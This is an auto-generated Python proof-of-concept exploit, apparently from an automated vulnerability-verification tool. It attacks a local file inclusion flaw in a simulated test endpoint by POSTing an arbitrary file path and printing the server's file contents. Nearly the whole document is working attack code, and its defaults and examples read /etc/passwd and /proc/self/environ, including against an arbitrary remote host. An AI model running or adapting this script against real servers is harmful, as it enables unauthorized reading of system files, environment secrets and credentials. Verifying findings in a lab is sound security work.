#!/usr/bin/env python3
# PoC for allpaths_test_p8irs888 (/tmp/allpaths_test_p8irs888)
# Path: lfi-001
# Sink: read_file
# Auto-generated — run with: python3 lfi_verifier_pattern_evidence_llm_read_file.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for allpaths_test_p8irs888 LFI Vulnerability

Vulnerability: Local File Inclusion (LFI) via unsanitized 'path' parameter
Target: /tmp/allpaths_test_p8irs888 simulated web endpoint
Impact: Arbitrary file read on the server

The application takes a 'path' parameter from user input and passes it directly
to open() without any sanitization, allowing path traversal attacks.
"""

import requests
import sys
import argparse
import os

def exploit_lfi(target_url, file_path, output_file=None):
    """
    Exploit the LFI vulnerability to read arbitrary files
    
    Args:
        target_url: Base URL of the vulnerable endpoint
        file_path: Path to the file to read (e.g., /etc/passwd)
        output_file: Optional file to save the output
    
    Returns:
        bool: True if successful, False otherwise
    """
    # Construct the full URL with the path parameter
    # The endpoint is /api/v1/trigger as per the simulated wrapper
    endpoint = f"{target_url.rstrip('/')}/api/v1/trigger"
    
    # Prepare the payload - directly inject the file path
    payload = {
        'path': file_path
    }
    
    print(f"[*] Attempting LFI exploit against {endpoint}")
    print(f"[*] Payload: path={file_path}")
    
    try:
        # Send the request with a reasonable timeout
        response = requests.post(endpoint, data=payload, timeout=10)
        
        # Check if the request was successful
        if response.status_code == 200:
            print(f"[+] Success! Status code: {response.status_code}")
            
            # Display the response content (the file contents)
            content = response.text
            print(f"[+] File contents ({len(content)} bytes):")
            print("-" * 50)
            print(content[:2000])  # Limit output to prevent flooding
            if len(content) > 2000:
                print("... (truncated, use -o to save full output)")
            print("-" * 50)
            
            # Save to file if requested
            if output_file:
                with open(output_file, 'w') as f:
                    f.write(content)
                print(f"[+] Output saved to {output_file}")
            
            return True
        else:
            print(f"[-] Request failed with status code: {response.status_code}")
            print(f"[-] Response: {response.text[:500]}")
            return False
            
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not connect to {target_url}")
        print("[-] Make sure the target server is running and accessible")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out after 10 seconds")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC Exploit for allpaths_test_p8irs888 LFI Vulnerability",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t http://localhost:5000 -f /etc/passwd
  %(prog)s -t http://target.com -f /proc/self/environ -o output.txt
  %(prog)s -t http://localhost:5000 -f /tmp/poc_success.txt  # Benign test
        """
    )
    
    parser.add_argument(
        '-t', '--target',
        required=True,
        help='Target URL (e.g., http://localhost:5000)'
    )
    
    parser.add_argument(
        '-f', '--file',
        default='/etc/passwd',
        help='File path to read (default: /etc/passwd)'
    )
    
    parser.add_argument(
        '-o', '--output',
        help='Save output to file (optional)'
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("LFI Exploit PoC - allpaths_test_p8irs888")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] File: {args.file}")
    print()
    
    # Execute the exploit
    success = exploit_lfi(args.target, args.file, args.output)
    
    if success:
        print("\n[✓] Exploit completed successfully")
        sys.exit(0)
    else:
        print("\n[✗] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
